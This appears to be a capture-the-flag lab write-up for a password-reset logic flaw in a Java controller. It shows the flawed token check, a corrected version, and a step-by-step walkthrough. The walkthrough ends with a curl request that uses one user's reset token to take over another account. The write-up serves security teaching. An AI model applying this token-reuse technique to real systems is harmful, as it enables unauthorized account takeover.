# Level 2 — Arbitrary Password Reset

## Challenge Description

This challenge simulates a system with a logic vulnerability in the password reset flow. The system validates the verification token's (Token) validity but does not check the binding between the token and the user account. This allows attackers to use a token obtained for their own account to reset another user's password.

**Objective**: Reset user `lucy`'s password. The Flag is returned upon success.

**Hint**: There is a user account called `lucy` in the system.

## Vulnerability Analysis

### Code Logic

The backend code is located in `PasswordResetController.java`. Three key endpoints are involved:

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/challenge/auth-session/pwrest/send_code` | GET | Send verification code (simulated email) |
| `/api/challenge/auth-session/pwrest/check_code` | GET | Verify code, return reset token |
| `/api/challenge/auth-session/pwrest/pw_rest` | POST | Reset password |

### Data Flow

```
Step 1: Get verification code
  GET /send_code?username=jack&email=jack@madrabbit.com
    ↓
  Verify username + email match → Generate 6-digit code → Store in captchaStore
    ↓
  Return code (simulated email display)

Step 2: Verify code, get reset token
  GET /check_code?username=jack&email=jack@madrabbit.com&code=123456
    ↓
  Verify code correct → Generate token → Store in resetTokens(token → jack)
    ↓
  Return token (via Cookie: pwreset_token)

Step 3: Reset password
  POST /pw_rest  {username: "jack", newPassword: "xxx", token: "..."}
    ↓
  Verify token exists in resetTokens → ✅ Valid
  【VULNERABILITY】No check that the token's bound user matches the requested username
    ↓
  Update the password for the requested username
```

### Vulnerability Detail

**Key code** (`PasswordResetController.java`, lines 254-263):

```java
// Verify token exists
String tokenUsername = resetTokens.get(token);
if (tokenUsername == null) {
    result.put("message", "Invalid or expired verification token");
    return ResponseEntity.status(400).body(result);
}

// 【VULNERABILITY】Only verifies token validity, does not check token-username binding
// Attackers can use their own token but change username to someone else's account
```

The `resetTokens` data structure is `Map<String, String>`, where `key = token` and `value = the username during verification`. The code verifies the token exists (i.e., the credential is valid) but **never compares `tokenUsername` (the user bound to the credential) with the `username` in the request (the target user to reset)**.

### Secure Implementation

```java
// Secure approach: Verify token-username binding
String tokenUsername = resetTokens.get(token);
if (tokenUsername == null || !tokenUsername.equals(username)) {
    result.put("message", "Invalid or expired verification token");
    return ResponseEntity.status(400).body(result);
}
```

## Walkthrough

### Step 1: Get a verification code for your own account

The system user `lili` has the email `lili@madrabbit.com`. The verification code for this email will be displayed on the page (simulated):

```
GET /api/challenge/auth-session/pwrest/send_code?username=lili&email=lili@madrabbit.com
```

Response:

```json
{
  "success": true,
  "message": "The email has been sent, please check",
  "code": "385712"
}
```

### Step 2: Verify the code and get a reset token

```
GET /api/challenge/auth-session/pwrest/check_code?username=lili&email=lili@madrabbit.com&code=385712
```

Response:

```json
{
  "success": true,
  "message": "Verification successful",
  "token": "e627322182563534b9bbd2c45f44efe74836eab92a8d640ab9775bf7a2fe0c85"
}
```

This token is bound to user `lili`, but the server does not check this binding during password reset.

### Step 3: Use lili's token to reset lucy's password

```bash
curl -X POST http://localhost:8080/api/challenge/auth-session/pwrest/pw_rest \
  -H "Content-Type: application/json" \
  -d '{"username":"lucy","newPassword":"hacked123","token":"e627322182563534b9bbd2c45f44efe74836eab92a8d640ab9775bf7a2fe0c85"}'
```

Response:

```json
{
  "success": true,
  "message": "Password reset successful",
  "flag": "flag{...}"
}
```

> **Note**: Verification codes and tokens are single-use. If a code has expired, you need to obtain a new one.

### Step 4: Submit the Flag

Submit the obtained Flag in the challenge's Flag submission box to complete the level.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/authsession/PasswordResetController.java` | Backend password reset endpoint, token not bound to user |
| `static/challenges/auth-session/passwd-reset.html` | Frontend challenge page |
| `service/FlagService.java` | Flag retrieval and validation |
| `service/UserService.java` | User query and password update |
